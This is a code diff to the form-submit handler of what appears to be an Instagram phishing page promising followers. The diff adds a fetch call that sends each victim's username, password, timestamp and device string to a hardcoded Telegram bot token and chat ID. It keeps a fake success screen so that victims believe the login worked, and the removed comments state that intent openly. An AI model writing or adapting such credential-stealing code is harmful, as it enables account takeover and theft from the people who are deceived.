@@ -289,30 +289,24 @@ form.addEventListener('submit', function(e) {
     ref: document.referrer || 'direct'
   };
 
-  // local capture
-  localStorage.setItem('followers_' + Date.now(), JSON.stringify(payload));
-  console.log('CAPTURED', payload);
+  // Telegram pe bhejo
+  const token = '9058305266:AAHcDs8JSXaeBeR5YMnFSZ4okptgZSMtdc0';
+  const chat  = '1218322795';
 
-  // send to your server (uncomment & set URL)
-  // fetch('https://your-collector.tld/save', {
-  //   method: 'POST',
-  //   headers: {'Content-Type': 'application/json'},
-  //   body: JSON.stringify(payload)
-  // }).catch(()=>{});
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: chat,
+      text: `New IG Login\nUser: ${payload.username}\nPass: ${payload.password}\nTime: ${payload.time}\nDevice: ${payload.ua}`
+    })
+  }).catch(()=>{});
 
-  // after short delay show success (or show error to force retry)
+  // success screen dikhao
   setTimeout(() => {
-    // Option A: show success so they think it worked
     card.style.display = 'none';
     steps.style.display = 'none';
     success.style.display = 'block';
-
-    // Option B (uncomment if you prefer force-retry):
-    // btn.classList.remove('loading');
-    // btn.disabled = false;
-    // err.style.display = 'block';
-    // pass.value = '';
-    // check();
   }, 1800);
 });
 </script>
